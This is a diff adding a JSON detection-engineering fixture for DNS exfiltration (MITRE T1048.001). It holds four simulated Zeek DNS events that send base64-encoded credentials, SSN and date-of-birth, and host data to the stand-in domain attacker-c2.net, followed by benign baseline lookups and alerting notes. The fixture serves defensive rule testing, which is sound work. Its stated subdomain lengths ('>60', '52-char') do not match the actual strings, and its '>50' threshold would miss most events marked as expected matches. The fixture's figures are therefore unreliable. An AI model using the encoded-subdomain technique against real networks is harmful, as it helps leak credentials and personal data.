@@ -1,0 +1,249 @@
+{
+  "technique_id": "T1048.001",
+  "technique_name": "Exfiltration Over Alternative Protocol: DNS Exfiltration",
+  "description": "Simulates attacker exfiltrating data by encoding it in base64 and embedding it in DNS query subdomains. High query volume with unusually long subdomain strings (>60 chars) to an external resolver.",
+  "platform": "network",
+  "mitre_tactic": "exfiltration",
+  "events": {
+    "attack_sequence": [
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "network",
+          "type": "protocol",
+          "kind": "event",
+          "dataset": "zeek.dns",
+          "module": "zeek"
+        },
+        "source": { "ip": "10.0.1.55", "port": 54321 },
+        "destination": { "ip": "8.8.8.8", "port": 53 },
+        "network": { "transport": "udp", "protocol": "dns" },
+        "dns": {
+          "question": {
+            "name": "dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9c2VjcmV0MTIz.exfil.attacker-c2.net",
+            "type": "A",
+            "class": "IN",
+            "subdomain": "dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9c2VjcmV0MTIz",
+            "registered_domain": "attacker-c2.net"
+          },
+          "response_code": "NOERROR"
+        },
+        "zeek": {
+          "dns": {
+            "uid": "Cabcdef1234567890",
+            "query": "dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9c2VjcmV0MTIz.exfil.attacker-c2.net",
+            "qtype_name": "A"
+          }
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1048.001",
+          "platform": "network",
+          "expected_match": true,
+          "sequence_order": 1,
+          "sequence_total": 4,
+          "description": "DNS query with 52-char base64-encoded subdomain — decodes to: username=admin&password=secret123"
+        }
+      },
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "network",
+          "type": "protocol",
+          "kind": "event",
+          "dataset": "zeek.dns",
+          "module": "zeek"
+        },
+        "source": { "ip": "10.0.1.55", "port": 54322 },
+        "destination": { "ip": "8.8.8.8", "port": 53 },
+        "network": { "transport": "udp", "protocol": "dns" },
+        "dns": {
+          "question": {
+            "name": "c3NudW1iZXI9MTIzLTQ1LTY3ODkmZG9iYT0xOTg1LTA2LTE1.exfil.attacker-c2.net",
+            "type": "A",
+            "class": "IN",
+            "subdomain": "c3NudW1iZXI9MTIzLTQ1LTY3ODkmZG9iYT0xOTg1LTA2LTE1",
+            "registered_domain": "attacker-c2.net"
+          },
+          "response_code": "NOERROR"
+        },
+        "zeek": {
+          "dns": {
+            "uid": "Cdefgh2345678901",
+            "query": "c3NudW1iZXI9MTIzLTQ1LTY3ODkmZG9iYT0xOTg1LTA2LTE1.exfil.attacker-c2.net",
+            "qtype_name": "A"
+          }
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1048.001",
+          "platform": "network",
+          "expected_match": true,
+          "sequence_order": 2,
+          "sequence_total": 4,
+          "description": "DNS query with 52-char base64 subdomain — second chunk of exfiltrated SSN and DOB data"
+        }
+      },
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "network",
+          "type": "protocol",
+          "kind": "event",
+          "dataset": "zeek.dns",
+          "module": "zeek"
+        },
+        "source": { "ip": "10.0.1.55", "port": 54323 },
+        "destination": { "ip": "8.8.8.8", "port": 53 },
+        "network": { "transport": "udp", "protocol": "dns" },
+        "dns": {
+          "question": {
+            "name": "bGlzdGVuaW5nX3BvcnQ9NDQ0MyZhZ2VudF9pZD1hYmNkZWYxMjM0NTY3ODk.exfil.attacker-c2.net",
+            "type": "A",
+            "class": "IN",
+            "subdomain": "bGlzdGVuaW5nX3BvcnQ9NDQ0MyZhZ2VudF9pZD1hYmNkZWYxMjM0NTY3ODk",
+            "registered_domain": "attacker-c2.net"
+          },
+          "response_code": "NOERROR"
+        },
+        "zeek": {
+          "dns": {
+            "uid": "Cefghi3456789012",
+            "query": "bGlzdGVuaW5nX3BvcnQ9NDQ0MyZhZ2VudF9pZD1hYmNkZWYxMjM0NTY3ODk.exfil.attacker-c2.net",
+            "qtype_name": "A"
+          }
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1048.001",
+          "platform": "network",
+          "expected_match": true,
+          "sequence_order": 3,
+          "sequence_total": 4,
+          "description": "DNS query with 64-char base64 subdomain — encodes agent configuration data"
+        }
+      },
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "network",
+          "type": "protocol",
+          "kind": "event",
+          "dataset": "zeek.dns",
+          "module": "zeek"
+        },
+        "source": { "ip": "10.0.1.55", "port": 54324 },
+        "destination": { "ip": "8.8.8.8", "port": 53 },
+        "network": { "transport": "udp", "protocol": "dns" },
+        "dns": {
+          "question": {
+            "name": "aG9zdG5hbWU9V1MtRklOQU5DRS0wMSZpcD0xMC4wLjEuNTU.exfil.attacker-c2.net",
+            "type": "A",
+            "class": "IN",
+            "subdomain": "aG9zdG5hbWU9V1MtRklOQU5DRS0wMSZpcD0xMC4wLjEuNTU",
+            "registered_domain": "attacker-c2.net"
+          },
+          "response_code": "NOERROR"
+        },
+        "zeek": {
+          "dns": {
+            "uid": "Cfghij4567890123",
+            "query": "aG9zdG5hbWU9V1MtRklOQU5DRS0wMSZpcD0xMC4wLjEuNTU.exfil.attacker-c2.net",
+            "qtype_name": "A"
+          }
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1048.001",
+          "platform": "network",
+          "expected_match": true,
+          "sequence_order": 4,
+          "sequence_total": 4,
+          "description": "DNS query with 52-char base64 subdomain — encodes hostname and internal IP address"
+        }
+      }
+    ],
+    "benign_similar": [
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "network",
+          "type": "protocol",
+          "kind": "event",
+          "dataset": "zeek.dns",
+          "module": "zeek"
+        },
+        "source": { "ip": "10.0.1.50", "port": 49200 },
+        "destination": { "ip": "10.0.0.2", "port": 53 },
+        "network": { "transport": "udp", "protocol": "dns" },
+        "dns": {
+          "question": {
+            "name": "teams.microsoft.com",
+            "type": "A",
+            "class": "IN",
+            "registered_domain": "microsoft.com"
+          },
+          "response_code": "NOERROR"
+        },
+        "zeek": {
+          "dns": {
+            "uid": "Cghijk5678901234",
+            "query": "teams.microsoft.com",
+            "qtype_name": "A"
+          }
+        },
+        "_simulation": {
+          "type": "baseline",
+          "technique": "T1048.001",
+          "platform": "network",
+          "expected_match": false,
+          "description": "Normal DNS resolution for Microsoft Teams — short, well-known domain"
+        }
+      },
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "network",
+          "type": "protocol",
+          "kind": "event",
+          "dataset": "zeek.dns",
+          "module": "zeek"
+        },
+        "source": { "ip": "10.0.1.51", "port": 49201 },
+        "destination": { "ip": "10.0.0.2", "port": 53 },
+        "network": { "transport": "udp", "protocol": "dns" },
+        "dns": {
+          "question": {
+            "name": "prod-alb-1234567890.us-west-2.elb.amazonaws.com",
+            "type": "A",
+            "class": "IN",
+            "registered_domain": "amazonaws.com"
+          },
+          "response_code": "NOERROR"
+        },
+        "zeek": {
+          "dns": {
+            "uid": "Chijkl6789012345",
+            "query": "prod-alb-1234567890.us-west-2.elb.amazonaws.com",
+            "qtype_name": "A"
+          }
+        },
+        "_simulation": {
+          "type": "baseline",
+          "technique": "T1048.001",
+          "platform": "network",
+          "expected_match": false,
+          "description": "AWS ALB DNS lookup — longer subdomain but well-known registered domain, not base64 pattern"
+        }
+      }
+    ]
+  },
+  "expected_detection": {
+    "should_alert_on": "attack_sequence",
+    "should_not_alert_on": "benign_similar",
+    "key_fields": ["dns.question.name", "dns.question.subdomain", "dns.question.registered_domain", "source.ip"],
+    "notes": "Alert on DNS queries where subdomain length > 50 characters AND the registered_domain is not in an approved allowlist. Add entropy scoring (base64 characters have high entropy) to reduce FPs from AWS ELB/CloudFront hostnames."
+  },
+  "log_sources_used": ["zeek_dns"],
+  "platforms": ["network"]
+}
